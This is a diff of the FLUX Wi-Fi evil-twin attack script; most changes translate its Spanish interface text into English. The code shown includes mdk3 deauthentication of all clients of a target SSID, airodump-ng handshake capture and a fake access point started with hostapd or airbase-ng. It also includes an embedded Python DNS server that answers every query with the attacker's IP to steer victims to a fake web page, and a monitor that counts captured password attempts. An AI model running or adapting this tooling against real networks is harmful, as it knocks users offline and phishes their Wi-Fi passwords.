@@ -97,7 +97,7 @@ trap exitmode SIGINT SIGHUP
 # KILL ALL 
 function exitmode {
 	
-	echo -e "\n\n"$white"["$red" "$white"] "$red"Ejecutando la limpieza y cerrando."$transparent""
+	echo -e "\n\n"$white"["$red" "$white"] "$red"Cleaning and closing"$transparent""
 	
 	if ps -A | grep -q aireplay-ng; then
 		echo -e ""$white"["$red"-"$white"] "$white"Matando "$grey"aireplay-ng"$transparent""
@@ -176,13 +176,13 @@ function exitmode {
 
 # Genera listado de Interfaces en el Script
 readarray -t webinterfaces < <(echo -e "Web Interface
-\e[1;31mSalir"$transparent""
+\e[1;31mExit"$transparent""
 )
 
 # Genera listado de Idiomas web
 readarray -t webinterfaceslenguage < <(echo -e "Engish [ENG]
 Spanish[ESP] GERMAN [GER]
-\e[1;31mAtras"$transparent""
+\e[1;31mBack"$transparent""
 )
 
 #Language for Web Interface
@@ -252,7 +252,7 @@ function mostrarheader(){
 	conditional_clear
 	echo -e "$green #########################################################"
 	echo -e "$green #                                                       #"
-	echo -e "$green #$red		 FLUX $version" "${yellow}by ""${blue}deltax""$green                     #"
+	echo -e "$green #$red		 FLUX $version" "${yellow}by ""${blue}deltax""$green                     #"${blue}
 	echo -e "$green #""${red}	F""${yellow}lux" "${red}I""${yellow}s" "${red}N""${yellow}ot a ""${red}S""${yellow}ocial ""${red}E""${yellow}nginering" "${red}T""${yellow}ool""$green             #"
 	echo -e "$green #                                                       #"
 	echo -e "$green #########################################################""$transparent"
@@ -510,9 +510,9 @@ function infoap {
 	echo "INFO WIFI"
 	echo
 	echo -e "                     "$green "SSID"$transparent" = $Host_SSID / $Host_ENC"
-	echo -e "                    "$green "Canal"$transparent" = $channel"
-	echo -e "                "$green "Velocidad"$transparent" = ${speed:2} Mbps"
-	echo -e "               "$green "MAC del AP"$transparent" = $mac (\e[1;33m$Host_MAC_MODEL"$transparent")"
+	echo -e "                    "$green "Channel"$transparent" = $channel"
+	echo -e "                "$green "Speed"$transparent" = ${speed:2} Mbps"
+	echo -e "               "$green "BSSID"$transparent" = $mac (\e[1;33m$Host_MAC_MODEL"$transparent")"
 	echo
 }
 
@@ -732,7 +732,7 @@ function Scanchan {
 	conditional_clear
 	
 	rm -rf $DUMP_PATH/dump*
-	xterm $HOLD -title "Scanning Target -->  $channel_number" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR
+	xterm $HOLD -title "Scanning Target  [$channel_number]" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR
 }
 
 # Scans the entire network 
@@ -832,7 +832,7 @@ function askAP {
 		
 		infoap
 		
-		echo "MODO DE FakeAP"
+		echo "MODE FakeAP"
 		echo "                                       "
 		echo -e "      "$green "1)"$transparent" Hostapd ("$red"Recomendado"$transparent")"
 		echo -e "      "$green "2)"$transparent" airbase-ng (Conexion mas lenta)"
@@ -862,8 +862,7 @@ function askauth {
 		echo "METHOD TO VERIFICATION THE PASSWORD"
 		echo "                                       "
 		echo -e "      "$green "1)"$transparent" Handshake ("$red"Recommended"$transparent")"
-		echo -e "      "$green "2)"$transparent" Wpa_supplicant(Less effective /
-More failures)"
+		echo -e "      "$green "2)"$transparent" Wpa_supplicant(More failures)"
 		echo -e "      "$green "3)"$transparent" Back"
 		echo "                                       "
 		echo -n "      #> "
@@ -887,7 +886,7 @@ function handshakelocation {
 	mostrarheader
 	infoap
 	echo
-	echo -e "Introduzca la ruta del handshake que desea auditar (Ej: $red/root/micaptura.cap$transparent)"
+	echo -e "handshake path  (Ej: $red/root/micaptura.cap$transparent)"
 	echo -e "Press ${yellow}ENTER$transparent to skip"
 	echo
 	echo -n "Path: "
@@ -958,7 +957,7 @@ function deauthforce {
 	mostrarheader
 	while true; do
 		
-		echo "TIPO DE COMPROBACION DEL HANDSHAKE"
+		echo "handshake check"
 		echo "                                       "
 		echo -e "      "$green "1)"$transparent" aircrack-ng (Posibilidades de fallo)"
 		echo -e "      "$green "2)"$transparent" pyrit"
@@ -1066,7 +1065,7 @@ function deauth {
 
 function deauthMENU {
 	
-	Handshake_statuscheck="${grey}Sin handshake$transparent"
+	Handshake_statuscheck="${grey}No handshake$transparent"
 	
 	while true; do
 		conditional_clear
@@ -1074,10 +1073,10 @@ function deauthMENU {
 		
 		echo "*Capture Handshake* "
 		echo 
-		echo -e "Estado del handshake: $Handshake_statuscheck"
+		echo -e "Status handshake: $Handshake_statuscheck"
 		echo
 		echo -e "      "$green "1)"$transparent" Yes" 
-		echo -e "      "$green "2)"$transparent" No "
+		echo -e "      "$green "2)"$transparent" Deauth all "
 		echo -e "      "$green "3)"$transparent" No (Select another attack)"  
 		echo -e "      "$green "4)"$transparent" Select another network"  
 		echo -e "      "$green "5)"$transparent" Exit"
@@ -1118,7 +1117,7 @@ function checkhandshake {
 			webinterface
 			break
 		else
-			Handshake_statuscheck="${red}Malo$transparent"
+			Handshake_statuscheck="${red}Error$transparent"
 		fi
 	elif [ "$handshakemode" = "hard" ]; then
 		cp $DUMP_PATH/$Host_MAC-01.cap $DUMP_PATH/test.cap &>$flux_output_device
@@ -1129,9 +1128,9 @@ function checkhandshake {
 			break
 		else
 			if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
-				Handshake_statuscheck="${yellow}Corrupto$transparent"
+				Handshake_statuscheck="${yellow}Corrupt$transparent"
 			else
-				Handshake_statuscheck="${red}Malo$transparent"
+				Handshake_statuscheck="${red}Error$transparent"
 			fi
 		fi
 		
@@ -1157,11 +1156,11 @@ function webinterface {
 		
 		infoap
 		echo
-		echo "SELECCIONA LA INTERFACE WEB"
+		echo "Select Web Interface"
 		echo
 		
-		echo -e "$green ""1)"$transparent" Interface web neutra"
-		echo -e "$green ""2)"$transparent" \e[1;31mSalir"$transparent""
+		echo -e "$green ""1)"$transparent" Web Interface"
+		echo -e "$green ""2)"$transparent" \e[1;31mExit"$transparent""
 		
 		echo
 		echo -n "#? "
@@ -1184,7 +1183,7 @@ function webinterface {
 			echo -e "$green ""4)"$transparent" French      [FR]"
 			echo -e "$green ""5)"$transparent" Portuguese  [POR]"
 			echo -e "$green ""6)"$transparent" German      [GER]"
-			echo -e "$green ""7)"$transparent" \e[1;31mAtras"$transparent""
+			echo -e "$green ""7)"$transparent" \e[1;31mBack"$transparent""
 			
 			echo
 			echo -n "#? "
@@ -1412,8 +1411,8 @@ class DNSQuery:
     self.data=data
     self.dominio=''
 
-    tipo = (ord(data[2]) >> 3) & 15   # 4bits de tipo de consulta
-    if tipo == 0:                     # Standard query
+    tipo = (ord(data[2]) >> 3) & 15   
+    if tipo == 0:                    
       ini=12
       lon=ord(data[ini])
       while lon != 0:
@@ -1434,7 +1433,7 @@ class DNSQuery:
 
 if __name__ == '__main__':
   ip='$IP'
-  print 'FAKEDNS:: dom.query. 60 IN A %s' % ip
+  print 'pyminifakeDNS:: dom.query. 60 IN A %s' % ip
 
   udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   udps.bind(('',53))
@@ -1444,7 +1443,7 @@ if __name__ == '__main__':
       data, addr = udps.recvfrom(1024)
       p=DNSQuery(data)
       udps.sendto(p.respuesta(ip), addr)
-      print "Answer:" %s -> %s' % (p.dominio, ip)
+      print 'Request: %s -> %s' % (p.dominio, ip)
   except KeyboardInterrupt:
     print 'Finalizando'
     udps.close()
@@ -1519,9 +1518,9 @@ function attack {
 	killall aireplay-ng &> $flux_output_device
 	killall mdk3 &> $flux_output_device
 	echo "$(strings $DUMP_PATH/dump-02.csv | cut -d "," -f1,14 | grep -h "$Host_SSID" | cut -d "," -f1)" >$DUMP_PATH/mdk3.txt
-	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Desautentificando con mdk3 a todos de $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
+	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauth all [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
 	
-	xterm -hold $TOPRIGHT -title "Esperando la pass" -e $DUMP_PATH/handcheck &
+	xterm -hold $TOPRIGHT -title "Wifi Information" -e $DUMP_PATH/handcheck &
 	conditional_clear
 	
 	while true; do
@@ -1623,15 +1622,15 @@ function handshakecheck {
 	
 	echo
 	echo -e \"  PUNTO DE ACCESO:\"
-	echo -e \"    Nombre..........: "$white"$Host_SSID"$transparent"\"
+	echo -e \"    Number..........: "$white"$Host_SSID"$transparent"\"
 	echo -e \"    MAC.............: "$yellow"$Host_MAC"$transparent"\"
-	echo -e \"    Canal...........: "$white"$Host_CHAN"$transparent"\"
-	echo -e \"    Fabricante......: "$green "$Host_MAC_MODEL"$transparent"\"
-	echo -e \"    Tiempo activo...: "$grey"\$ih\$horas:\$im\$minutos:\$is\$segundos"$transparent"\"
-	echo -e \"    Intentos........: "$red"\$(cat $DUMP_PATH/hit.txt)"$transparent"\"
+	echo -e \"    Channel.........: "$white"$Host_CHAN"$transparent"\"
+	echo -e \"    Brand...........: "$green "$Host_MAC_MODEL"$transparent"\"
+	echo -e \"    Operation time...: "$grey"\$ih\$horas:\$im\$minutos:\$is\$segundos"$transparent"\"
+	echo -e \"    Attempts........: "$red"\$(cat $DUMP_PATH/hit.txt)"$transparent"\"
 	echo -e \"    Clientes........: "$blue"\$(cat $DUMP_PATH/clientes.txt | grep DHCPACK | sort| uniq | wc -l)"$transparent"\"
 	echo
-	echo -e \"  CLIENTES ACTIVOS:\"
+	echo -e \"  CLIENTES ONLINE:\"
 	
 	x=0
 	for cliente in \"\${CLIENTESDHCP[@]}\"; do
